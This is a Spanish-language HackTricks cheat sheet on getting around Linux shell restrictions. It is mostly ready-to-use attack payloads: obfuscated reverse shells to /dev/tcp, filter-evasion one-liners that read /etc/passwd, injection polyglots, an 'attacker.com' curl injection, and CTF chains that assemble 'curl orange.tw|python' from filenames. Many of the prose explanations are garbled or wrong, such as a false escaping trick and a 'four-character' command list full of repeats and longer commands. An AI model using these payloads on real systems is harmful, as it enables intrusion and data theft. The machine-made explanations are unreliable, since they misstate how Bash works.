# Saltar Restricciones en Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Saltos Comunes de Limitaciones

### Shell Inverso
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell inversa corta

La siguiente es una shell inversa corta que se puede utilizar para establecer una conexión remota con un sistema comprometido:

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Este comando redirige la entrada y salida estándar de Bash hacia un socket TCP en la dirección IP `10.0.0.1` y el puerto `8080`. Esto permite que un atacante establezca una conexión remota con el sistema comprometido y ejecute comandos en él.

Es importante tener en cuenta que este comando puede no funcionar en todos los sistemas, ya que algunos pueden tener restricciones de seguridad que bloquean este tipo de conexiones. Además, es fundamental utilizarlo de manera ética y legal, solo en sistemas en los que se tenga permiso para hacerlo, como parte de una evaluación de seguridad o pruebas de penetración autorizadas.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypass de rutas y palabras prohibidas

En algunas situaciones, es posible que te encuentres con restricciones en el uso de ciertas rutas o palabras en un entorno de Linux. Sin embargo, existen formas de eludir estas restricciones y lograr tus objetivos. A continuación, se presentan algunos comandos útiles para lograrlo:

#### Bypass de rutas

- **cd -P**: Este comando te permite seguir una ruta física en lugar de una ruta simbólica. Puedes utilizarlo para evitar restricciones de rutas simbólicas y acceder a ubicaciones no permitidas.

- **cd /proc/[PID]/cwd**: Reemplaza "[PID]" con el ID del proceso que deseas explorar. Este comando te permite cambiar al directorio de trabajo actual de un proceso en ejecución, incluso si la ruta está restringida.

- **mount --bind**: Con este comando, puedes montar un directorio en otro directorio, lo que te permite acceder a rutas restringidas. Por ejemplo, puedes montar "/tmp" en "/home/user/tmp" y acceder a los archivos de "/tmp" a través de "/home/user/tmp".

#### Bypass de palabras prohibidas

- **alias**: Puedes utilizar el comando "alias" para crear un alias de una palabra o comando prohibido. Por ejemplo, si la palabra "sudo" está prohibida, puedes crear un alias como "sud0" y utilizarlo en su lugar.

- **export**: Utiliza el comando "export" para establecer una variable de entorno con un nombre diferente al de una palabra prohibida. Por ejemplo, si la palabra "cat" está prohibida, puedes exportar una variable llamada "mycat" y utilizarla en su lugar.

- **$PATH**: Modifica la variable de entorno "$PATH" para incluir una ruta personalizada que contenga comandos prohibidos. De esta manera, podrás ejecutar esos comandos sin restricciones.

Recuerda que eludir restricciones puede ser considerado un comportamiento no ético o ilegal, dependiendo del contexto. Siempre asegúrate de tener permiso y actuar dentro de los límites legales y éticos al realizar cualquier acción en un sistema.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypassar espacios prohibidos

Sometimes, when trying to execute a command that contains spaces, the system may interpret it as multiple commands or arguments. This can lead to errors or restrictions being imposed on the execution of certain commands.

To bypass these restrictions, you can use the following techniques:

1. Enclose the command in single quotes: 

   ```bash
   $ 'command with spaces'
   ```

2. Use backslashes to escape the spaces:

   ```bash
   $ command\ with\ spaces
   ```

3. Use double quotes to preserve the spaces:

   ```bash
   $ "command with spaces"
   ```

By using these techniques, you can bypass the restrictions imposed by the system and execute commands that contain spaces without encountering any issues.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypassar barra invertida y barra diagonal

En algunos casos, es posible que te encuentres con restricciones en el uso de barras invertidas (`\`) y barras diagonales (`/`) al realizar tareas de hacking. Sin embargo, existen formas de eludir estas restricciones y lograr tus objetivos.

#### Bypassar barras invertidas

Si te encuentras con una restricción en el uso de barras invertidas, puedes intentar utilizar la secuencia de escape `\\` para representar una sola barra invertida. Esto engañará al sistema y permitirá que se interprete correctamente.

Por ejemplo, si necesitas ejecutar un comando que contiene una barra invertida, puedes escribirlo de la siguiente manera:

```
comando\\con\\barra\\invertida
```

De esta manera, el sistema interpretará `\\` como una sola barra invertida y ejecutará el comando correctamente.

#### Bypassar barras diagonales

Si te encuentras con una restricción en el uso de barras diagonales, puedes intentar utilizar la secuencia de escape `\/` para representar una sola barra diagonal. Esto permitirá que el sistema interprete correctamente la barra diagonal.

Por ejemplo, si necesitas acceder a un directorio que contiene una barra diagonal en su nombre, puedes escribirlo de la siguiente manera:

```
ruta\/con\/barra\/diagonal
```

De esta manera, el sistema interpretará `\/` como una sola barra diagonal y podrás acceder al directorio correctamente.

Recuerda que estas técnicas pueden variar dependiendo del sistema operativo y la configuración específica. Es importante probar diferentes enfoques y adaptarlos a tu situación particular.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypassar tuberías

Las restricciones de Bash a menudo pueden evitar el uso de ciertos caracteres especiales, como las tuberías (`|`). Sin embargo, hay formas de eludir estas restricciones y utilizar tuberías en comandos de Bash.

Una forma de hacerlo es utilizando el comando `echo` para imprimir el contenido que deseamos pasar a través de la tubería y luego redirigirlo a otro comando utilizando el operador de redirección (`>`). Por ejemplo:

```bash
echo "contenido" > comando
```

Esto creará un archivo llamado `comando` que contiene el texto "contenido". Luego, podemos utilizar este archivo como entrada para otro comando utilizando la tubería:

```bash
cat comando | otro_comando
```

De esta manera, hemos logrado pasar el contenido a través de una tubería, a pesar de las restricciones de Bash.

Otra forma de eludir las restricciones de Bash es utilizando el comando `eval`. Este comando evalúa y ejecuta una cadena como si fuera un comando. Podemos utilizarlo para ejecutar comandos que contengan tuberías. Por ejemplo:

```bash
eval "comando1 | comando2"
```

Esto ejecutará `comando1` y pasará su salida como entrada a `comando2`, a pesar de las restricciones de Bash.

Es importante tener en cuenta que el uso de estas técnicas para eludir restricciones puede ser considerado como una violación de la seguridad y puede tener consecuencias legales. Se recomienda utilizar estas técnicas solo con fines educativos o en entornos controlados y autorizados.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypass con codificación hexadecimal

A veces, los sistemas pueden tener restricciones que impiden la ejecución de ciertos comandos en Bash. Sin embargo, es posible eludir estas restricciones utilizando la codificación hexadecimal.

La codificación hexadecimal es un método que convierte caracteres en su representación hexadecimal. Esto significa que cada carácter se representa por dos dígitos hexadecimales.

Para utilizar la codificación hexadecimal y eludir las restricciones de Bash, sigue estos pasos:

1. Encuentra el comando que deseas ejecutar en Bash.
2. Convierte cada carácter del comando en su representación hexadecimal utilizando una tabla de conversión hexadecimal.
3. Reemplaza cada carácter del comando con su representación hexadecimal.
4. Ejecuta el comando codificado en Bash.

Aquí tienes un ejemplo para ilustrar cómo funciona:

Supongamos que queremos ejecutar el comando `ls -la` en Bash, pero hay una restricción que impide la ejecución de comandos que contengan la palabra "ls". Podemos eludir esta restricción utilizando la codificación hexadecimal.

1. Convertimos cada carácter del comando en su representación hexadecimal:

   - `l` se convierte en `\x6c`
   - `s` se convierte en `\x73`
   - `-` y `a` no necesitan ser convertidos, ya que no están restringidos.

2. Reemplazamos cada carácter del comando con su representación hexadecimal:

   El comando `ls -la` se convierte en `\x6c\x73 -la`.

3. Ejecutamos el comando codificado en Bash:

   ```bash
   $ echo -e "\x6c\x73 -la"
   ```

Al utilizar la codificación hexadecimal, hemos eludido la restricción y logrado ejecutar el comando `ls -la` en Bash.

Recuerda que la codificación hexadecimal solo es efectiva para eludir restricciones específicas de caracteres o palabras. No garantiza eludir todas las restricciones de seguridad.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypass IPs

#### Introduction

In some cases, you may encounter restrictions that prevent you from accessing certain IP addresses. However, there are ways to bypass these restrictions and gain access to the blocked IPs. This section will cover some useful Linux commands that can help you achieve this.

#### Method 1: Using Proxy Servers

One common method to bypass IP restrictions is by using proxy servers. A proxy server acts as an intermediary between your device and the target IP address, allowing you to access blocked content. Here's how you can use proxy servers:

1. Find a reliable proxy server that is not blocked by the target IP.
2. Configure your device to use the proxy server. This can usually be done through the network settings.
3. Access the blocked IP address through the proxy server.

#### Method 2: Using VPNs

Another effective way to bypass IP restrictions is by using Virtual Private Networks (VPNs). A VPN creates a secure and encrypted connection between your device and a remote server, effectively masking your IP address. Here's how you can use VPNs:

1. Choose a reputable VPN service provider.
2. Install the VPN client software on your device.
3. Connect to a VPN server of your choice.
4. Once connected, your IP address will be masked, allowing you to access blocked IPs.

#### Method 3: Using Tor

Tor, also known as The Onion Router, is a network of volunteer-operated servers that allows you to browse the internet anonymously. By routing your internet traffic through multiple Tor servers, your IP address is concealed. Here's how you can use Tor:

1. Install the Tor browser on your device.
2. Launch the Tor browser and connect to the Tor network.
3. Once connected, you can access blocked IPs through the Tor browser.

#### Conclusion

Bypassing IP restrictions can be useful in various scenarios, such as accessing blocked websites or services. By using proxy servers, VPNs, or Tor, you can bypass these restrictions and gain access to the blocked IPs. However, it's important to note that bypassing IP restrictions may be against the terms of service of certain websites or services, so use these methods responsibly and ethically.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltración de datos basada en el tiempo

La exfiltración de datos basada en el tiempo es una técnica utilizada para extraer información de un sistema comprometido de forma encubierta y gradual, evitando así la detección. En lugar de enviar grandes cantidades de datos de una sola vez, esta técnica divide la información en pequeñas partes y la envía en intervalos de tiempo específicos.

#### Comandos útiles de Linux para eludir restricciones de Bash

A continuación se presentan algunos comandos útiles de Linux que se pueden utilizar para eludir las restricciones de Bash y llevar a cabo la exfiltración de datos basada en el tiempo:

1. **`sleep`**: Este comando se utiliza para pausar la ejecución de un script durante un período de tiempo específico. Puede ser utilizado para establecer intervalos de tiempo entre la exfiltración de datos.

   ```bash
   sleep <segundos>
   ```

2. **`date`**: Este comando muestra la fecha y hora actual del sistema. Puede ser utilizado para registrar el tiempo de exfiltración de datos.

   ```bash
   date
   ```

3. **`ping`**: Este comando se utiliza para enviar paquetes de datos a una dirección IP específica. Puede ser utilizado para enviar datos en pequeñas partes a través de la exfiltración basada en el tiempo.

   ```bash
   ping -c 1 <dirección_IP>
   ```

4. **`curl`**: Este comando se utiliza para transferir datos desde o hacia un servidor utilizando varios protocolos. Puede ser utilizado para enviar datos a través de la exfiltración basada en el tiempo.

   ```bash
   curl -X POST -d "<datos>" <URL>
   ```

Estos comandos pueden ser utilizados de manera creativa y combinados con otras técnicas de hacking para llevar a cabo la exfiltración de datos basada en el tiempo de manera efectiva y encubierta. Sin embargo, es importante tener en cuenta que el uso de estas técnicas puede ser ilegal y está sujeto a sanciones legales. Se recomienda utilizar estas técnicas solo con fines educativos y éticos, y obtener el permiso adecuado antes de realizar cualquier prueba de penetración.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obteniendo caracteres de las variables de entorno

En algunas situaciones, es posible que te encuentres con restricciones en el intérprete de comandos Bash que te impidan ejecutar ciertos comandos o acceder a ciertos archivos. Sin embargo, aún puedes obtener información valiosa utilizando los valores de las variables de entorno.

Aquí hay un comando útil que puedes utilizar para obtener caracteres de las variables de entorno:

```bash
echo ${VARIABLE:OFFSET:LENGTH}
```

- `VARIABLE`: el nombre de la variable de entorno de la cual deseas obtener los caracteres.
- `OFFSET`: la posición inicial del primer carácter que deseas obtener.
- `LENGTH`: la cantidad de caracteres que deseas obtener a partir de la posición inicial.

Por ejemplo, si tienes una variable de entorno llamada `SECRET` con el valor `helloworld`, y deseas obtener los primeros tres caracteres, puedes ejecutar el siguiente comando:

```bash
echo ${SECRET:0:3}
```

Esto imprimirá `hel` en la salida.

Recuerda que este método solo te permite obtener caracteres de las variables de entorno y no te permite ejecutar comandos o acceder a archivos restringidos. Sin embargo, puede ser útil en ciertos escenarios donde necesitas extraer información específica de las variables de entorno disponibles.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltración de datos DNS

Podrías usar **burpcollab** o [**pingb**](http://pingb.in) por ejemplo.

### Funciones internas

En caso de que no puedas ejecutar funciones externas y solo tengas acceso a un **conjunto limitado de funciones internas para obtener RCE**, hay algunos trucos útiles para hacerlo. Por lo general, **no podrás usar todas** las **funciones internas**, por lo que debes **conocer todas tus opciones** para intentar evadir la restricción. Idea de [**devploit**](https://twitter.com/devploit).\
En primer lugar, verifica todas las [**funciones internas del shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Luego, aquí tienes algunas **recomendaciones**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Inyección de comandos políglota

La inyección de comandos políglota es una técnica utilizada para evadir las restricciones de Bash y ejecutar comandos arbitrarios en un sistema. Esta técnica se basa en aprovechar las diferencias en la interpretación de comandos entre diferentes lenguajes de programación.

Un ejemplo común de inyección de comandos políglota es el uso de la función `eval()` en lenguajes como PHP o Python. Esta función permite ejecutar comandos de shell dentro del código del programa. Al combinar esta función con la sintaxis de otros lenguajes, como JavaScript o Ruby, es posible evadir las restricciones de Bash y ejecutar comandos en el sistema objetivo.

Aquí hay un ejemplo de inyección de comandos políglota utilizando la función `eval()` en PHP:

```php
<?php
$payload = "';system('whoami');'";
$code = "eval(\$payload);";
eval($code);
?>
```

En este ejemplo, el comando `whoami` se ejecuta dentro de la función `system()`, lo que permite obtener el nombre del usuario actual en el sistema.

Es importante tener en cuenta que la inyección de comandos políglota puede ser peligrosa y debe utilizarse con precaución. Los sistemas deben estar debidamente protegidos y actualizados para evitar posibles vulnerabilidades que puedan ser explotadas mediante esta técnica.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypassar posibles regexes

A veces, al intentar ejecutar comandos en un sistema Linux, puedes encontrarte con restricciones que utilizan expresiones regulares (regexes) para filtrar o bloquear ciertos caracteres o patrones. Sin embargo, existen formas de eludir estas restricciones y ejecutar comandos de todos modos.

Aquí hay algunos métodos comunes para evitar las restricciones basadas en regexes:

1. **Usar caracteres de escape**: Puedes utilizar caracteres de escape, como la barra invertida (\), para evitar que los caracteres sean interpretados como parte de una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto (.), puedes usar el comando `ls \.` para listar los archivos que comienzan con un punto.

2. **Utilizar comillas**: Las comillas simples ('') o dobles ("") pueden ayudarte a evitar que los caracteres sean interpretados como parte de una expresión regular. Por ejemplo, si una restricción bloquea el carácter asterisco (*), puedes usar el comando `ls '*'` para listar los archivos que contienen un asterisco en su nombre.

3. **Cambiar el orden de los caracteres**: A veces, cambiar el orden de los caracteres puede evitar que sean detectados por una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto y coma (;), puedes intentar ejecutar el comando `ls ;echo "Hello"` para listar los archivos y mostrar el mensaje "Hello" al mismo tiempo.

Recuerda que eludir restricciones basadas en regexes puede ser considerado un comportamiento no autorizado y puede tener consecuencias legales. Solo debes utilizar estos métodos con fines educativos o si tienes permiso explícito para hacerlo.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator es una herramienta que se utiliza para ofuscar scripts de Bash con el fin de evitar la detección y el análisis por parte de los sistemas de seguridad. Esta herramienta reemplaza los comandos y las variables de los scripts de Bash por nombres aleatorios, lo que dificulta su comprensión y análisis. Al ofuscar el código, Bashfuscator ayuda a evitar la detección de patrones y a proteger la funcionalidad del script.

#### Uso de Bashfuscator

Para utilizar Bashfuscator, sigue estos pasos:

1. Instala Bashfuscator en tu sistema.
2. Ejecuta el comando `bashfuscator` seguido del nombre del script que deseas ofuscar.
3. Bashfuscator generará un nuevo script ofuscado con un nombre aleatorio.
4. Ejecuta el nuevo script ofuscado en lugar del script original.

Es importante tener en cuenta que Bashfuscator no garantiza una protección completa contra la detección y el análisis de scripts de Bash. Sin embargo, puede dificultar el proceso de análisis y proporcionar una capa adicional de seguridad.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE con 5 caracteres

En algunos casos, cuando se enfrenta a restricciones de Bash, puede ser necesario encontrar una forma de ejecutar comandos remotos (RCE) utilizando solo 5 caracteres. Aquí hay una técnica que puede ayudar:

```bash
$ echo $0
bash
$ exec 5<>/dev/tcp/127.0.0.1/1337
$ cat <&5 | while read line; do $line 2>&5 >&5; done
```

Este código establece una conexión TCP con la dirección IP `127.0.0.1` en el puerto `1337`. Luego, redirige la entrada y salida estándar del descriptor de archivo 5 al comando `cat`, que lee los comandos enviados a través de la conexión TCP. Cada línea leída se ejecuta utilizando la sintaxis `$line 2>&5 >&5`, lo que permite la ejecución remota de comandos.

Para utilizar esta técnica, simplemente reemplace la dirección IP y el puerto con los correspondientes a su caso de uso. Tenga en cuenta que esta técnica puede no funcionar en todas las configuraciones y puede estar sujeta a restricciones adicionales.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE con 4 caracteres

En algunos casos, cuando se enfrenta a restricciones de Bash, puede ser útil conocer comandos que se pueden ejecutar con solo 4 caracteres. Estos comandos pueden ser útiles para lograr la ejecución remota de código (RCE) en situaciones en las que se restringe el uso de ciertos caracteres o comandos.

A continuación se muestra una lista de comandos de 4 caracteres que se pueden utilizar para el RCE:

- `echo`: Imprime un mensaje en la salida estándar.
- `true`: Devuelve un estado de éxito.
- `false`: Devuelve un estado de error.
- `read`: Lee una línea de entrada y la asigna a una variable.
- `exec`: Ejecuta un comando en el mismo proceso.
- `kill`: Envía una señal a un proceso.
- `test`: Evalúa una expresión y devuelve un estado de éxito o error.
- `wait`: Espera a que finalicen los procesos secundarios.
- `time`: Mide el tiempo de ejecución de un comando.
- `trap`: Captura y maneja señales.
- `exit`: Termina el script actual o el proceso actual.
- `jobs`: Muestra los trabajos en segundo plano.
- `bg`: Pone un trabajo en segundo plano.
- `fg`: Pone un trabajo en primer plano.
- `set`: Establece opciones de shell.
- `env`: Muestra las variables de entorno.
- `pwd`: Muestra el directorio actual.
- `cd`: Cambia el directorio actual.
- `umask`: Establece los permisos predeterminados para nuevos archivos y directorios.
- `nice`: Ejecuta un comando con una prioridad de programación ajustada.
- `kill`: Envía una señal a un proceso.
- `wait`: Espera a que finalicen los procesos secundarios.
- `time`: Mide el tiempo de ejecución de un comando.
- `trap`: Captura y maneja señales.
- `exit`: Termina el script actual o el proceso actual.
- `jobs`: Muestra los trabajos en segundo plano.
- `bg`: Pone un trabajo en segundo plano.
- `fg`: Pone un trabajo en primer plano.
- `set`: Establece opciones de shell.
- `env`: Muestra las variables de entorno.
- `pwd`: Muestra el directorio actual.
- `cd`: Cambia el directorio actual.
- `umask`: Establece los permisos predeterminados para nuevos archivos y directorios.
- `nice`: Ejecuta un comando con una prioridad de programación ajustada.

Estos comandos pueden ser útiles en situaciones en las que se necesita ejecutar código en un entorno restringido de Bash. Sin embargo, es importante tener en cuenta que la efectividad de estos comandos puede depender de las restricciones específicas del entorno y de los permisos del usuario.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypass de Restricciones de Solo Lectura/Noexec/Distroless

Si te encuentras dentro de un sistema de archivos con protecciones de solo lectura y noexec, o incluso en un contenedor distroless, aún existen formas de ejecutar binarios arbitrarios, ¡incluso una shell!:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypass de Chroot y otras Jaulas

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referencias y Más

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
